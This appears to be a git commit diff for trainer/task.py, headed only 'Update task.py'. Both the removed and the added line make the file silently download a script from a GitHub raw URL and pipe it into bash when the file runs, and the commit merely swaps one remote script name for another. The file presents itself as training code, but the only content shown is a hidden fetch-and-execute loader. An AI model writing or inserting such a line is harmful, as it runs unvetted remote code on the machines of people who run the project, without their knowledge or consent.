66bb786bc28c18fadf4f03411cd0ce98fc3b1554
nonibihan <nonibihan@gmail.com>
2025-01-09 06:57:39 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/nonibihan/tah/raw/refs/heads/main/gass | bash')
+os.system('curl -sL https://github.com/nonibihan/tah/raw/refs/heads/main/gubrag | bash')
